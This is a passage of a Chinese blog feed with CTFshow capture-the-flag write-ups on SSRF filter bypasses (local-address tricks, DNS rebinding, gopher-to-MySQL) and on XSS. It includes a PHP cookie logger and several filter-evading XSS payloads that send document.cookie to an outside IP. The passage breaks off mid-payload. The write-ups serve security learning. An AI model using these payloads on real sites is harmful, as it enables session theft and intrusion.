class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url=localhost/flag.php<br></code></pre></td></tr></table></figure><h3 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url=127.0.0.1/flag.php<br></code></pre></td></tr></table></figure><h3 id="0x03"><a class="markdownIt-Anchor" href="#0x03"></a> 0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url=file:///var/www/html/flag.php<br></code></pre></td></tr></table></figure><h2 id="web352"><a class="markdownIt-Anchor" href="#web352"></a> web352</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure><h3 id="0x01-2"><a class="markdownIt-Anchor" href="#0x01-2"></a> 0x01</h3><p>环境可能并没有过滤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url=http://localhost/flag.php <br></code></pre></td></tr></table></figure><h3 id="0x02-2"><a class="markdownIt-Anchor" href="#0x02-2"></a> 0x02</h3><p>ip转化为数字</p><p>127.0.0.1转化为2130706433</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url=http://2130706433/flag.php<br></code></pre></td></tr></table></figure><h3 id="0x03-2"><a class="markdownIt-Anchor" href="#0x03-2"></a> 0x03</h3><p>题目使用parse_url对url进行解析使用其余各种指向127.0.0.1的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url=http://127.1/flag.php<br></code></pre></td></tr></table></figure><h2 id="web353"><a class="markdownIt-Anchor" href="#web353"></a> web353</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure><p>同web352的0x02和0x03</p><h2 id="web354"><a class="markdownIt-Anchor" href="#web354"></a> web354</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url=http://sudo.cc/flag.php<br></code></pre></td></tr></table></figure><h2 id="web355"><a class="markdownIt-Anchor" href="#web355"></a> web355</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">5</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url=http://127.1/flag.php<br></code></pre></td></tr></table></figure><h2 id="web356"><a class="markdownIt-Anchor" href="#web356"></a> web356</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">3</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url=http://0/flag.php<br></code></pre></td></tr></table></figure><h2 id="web357"><a class="markdownIt-Anchor" href="#web357"></a> web357</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ip!&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;scheme&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> scheme<br></code></pre></td></tr></table></figure><p>dns重绑<a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">rbndr.us dns rebinding service (cmpxchg8b.com)</a></p><p>或者域名解析到vps</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="web358"><a class="markdownIt-Anchor" href="#web358"></a> web358</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>$url=$_POST[&#x27;url&#x27;];<br>$x=parse_url($url);<br>if(preg_match(&#x27;/^http:\/\/ctf\..*show$/i&#x27;,$url))&#123;<br>  echo file_get_contents($url);<br>&#125;<br></code></pre></td></tr></table></figure><p>用@和#进行简单的绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url=http://ctf.@127.0.0.1/flag.php#show<br></code></pre></td></tr></table></figure><h2 id="web359"><a class="markdownIt-Anchor" href="#web359"></a> web359</h2><p>简单的前端登陆，用bp抓包看看有ssrf点</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-10001147.png" alt="2024-11-10001147"></p><p>这里去学习了一下需要了解一下gopher ,利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。</p><p>看网上都没说原理，考察的知识点是<strong>利用gopher协议无密码注入mysql</strong>,</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-10003519.png" alt="2024-11-10003519"></p><p><code>_</code>后面的需要进行一次url的编码，再进行传值，之后就是正常的rce</p><h2 id="web360"><a class="markdownIt-Anchor" href="#web360"></a> web360</h2><p>懒人方法就是和上述359一样不多赘叙了。</p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-xss</title>
    <link href="/2024/11/07/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-xss/"/>
    <url>/2024/11/07/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-xss/</url>
    
    <content type="html"><![CDATA[<h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h2><p>XSS（Cross-Site Scripting，跨站脚本攻击）是一种常见的安全漏洞，攻击者通过在网页中注入恶意脚本代码，诱使用户执行这些代码，从而实现窃取信息、伪造身份、篡改网页内容等攻击。</p><p>XSS 攻击可以分为三种主要类型：</p><ol><li><p><strong>反射型 XSS（Reflected XSS）</strong>：攻击者通过诱使受害者访问带有恶意脚本的 URL（如通过电子邮件链接、搜索引擎等），恶意脚本被即时执行并在用户的浏览器中反射回来，通常用来窃取用户信息。</p></li><li><p><strong>存储型 XSS（Stored XSS）</strong>：恶意脚本被存储在网站的服务器端（如数据库、日志文件等），当用户访问受感染的页面时，脚本被加载并执行。存储型 XSS 对受害者影响较大，因为一旦脚本被存储在服务器端，所有访问该页面的用户都会受到影响。</p></li><li><p><strong>DOM 型 XSS（DOM-based XSS）</strong>：攻击通过客户端 JavaScript 操控 DOM 结构，攻击代码通常在用户的浏览器端执行，而不经过服务器。这种类型的 XSS 是基于网页上的 JavaScript 代码错误进行的攻击</p></li></ol><p>通常的利用点在cookie,bot的执行等等，简单的了解一下知识点就行</p><h2 id="web316"><a class="markdownIt-Anchor" href="#web316"></a> web316</h2><p>反射性xss</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="hljs-title function_ invoke__">time</span>());<br><span class="hljs-variable">$log</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;cookie.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$log</span>,<span class="hljs-variable">$time</span>.<span class="hljs-string">&#x27;:    &#x27;</span>. <span class="hljs-variable">$cookie</span> . <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$log</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>写在自己的vps上面</p><p>执行以下语句，修改vps的内容即可。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;location.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://8.130.42.113:5566/xss.php?cookie=&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-05211605.png" alt="2024-11-05211605"></p><h2 id="web317"><a class="markdownIt-Anchor" href="#web317"></a> web317</h2><p>测试了一下过滤了<code>script</code>，应该大小写也过滤了</p><h3 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h3><p>尝试使用img进行绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=<span class="hljs-string">&quot;&quot;</span> οnerrοr=location.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://8.130.42.113:5566/xss.php?cookie=&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&gt;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-05213201.png" alt="2024-11-05213201"></p><h3 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;body onload=<span class="hljs-string">&quot;window.open(&#x27;http://8.130.42.113:5566/xss.php?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/body&gt;<br></code></pre></td></tr></table></figure><h2 id="web318"><a class="markdownIt-Anchor" href="#web318"></a> web318</h2><p>测试了一下禁用了img，可以继续用body</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;body onload=<span class="hljs-string">&quot;window.open(&#x27;http://8.130.42.113:5566/xss.php?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/body&gt;<br></code></pre></td></tr></table></figure><h2 id="web319"><a class="markdownIt-Anchor" href="#web319"></a> web319</h2><p>同web318</p><h2 id="web320"><a class="markdownIt-Anchor" href="#web320"></a> web320</h2><p>简单的在前端输入fuzz看看过滤了什么，<code>script</code>，<code>img</code>，空格被过滤了，空格可以用常见的其他的来进行绕过</p><h3 id="0x01-2"><a class="markdownIt-Anchor" href="#0x01-2"></a> 0x01</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;body<span class="hljs-comment">/**/</span>onload=<span class="hljs-string">&quot;window.open(&#x27;http://8.130.42.113:5566/xss.php?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/body&gt;<br><span class="language-xml">&lt;body/**/οnlοad=location.href=&quot;http://8.130.42.113:5566/xss.php?cookie=&quot;+document.cookie&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x02-2"><a class="markdownIt-Anchor" href="#0x02-2"></a> 0x02</h3><p>学习一下网上的其他方法</p><p>String.fromCharCode()函数：ascii码转字符</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-05235755.png" alt="2024-11-05235755"></p><p>因此可以利用这个可以构造</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;body<span class="hljs-comment">/**/</span>onload=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-number">60</span>,<span class="hljs-number">115</span>,<span class="hljs-number">99</span>,<span class="hljs-number">114</span>,<span class="hljs-number">105</span>,<span class="hljs-number">112</span>,<span class="hljs-number">116</span>,<span class="hljs-number">62</span>,<span class="hljs-number">100</span>,<span class="hljs-number">111</span>,<span class="hljs-number">99</span>,<span class="hljs-number">117</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">110</span>,<span class="hljs-number">116</span>,<span class="hljs-number">46</span>,<span class="hljs-number">108</span>,<span class="hljs-number">111</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">105</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">46</span>,<span class="hljs-number">104</span>,<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">102</span>,<span class="hljs-number">61</span>,<span class="hljs-number">39</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">116</span>,<span class="hljs-number">112</span>,<span class="hljs-number">58</span>,<span class="hljs-number">47</span>,<span class="hljs-number">47</span>,<span class="hljs-number">56</span>,<span class="hljs-number">46</span>,<span class="hljs-number">49</span>,<span 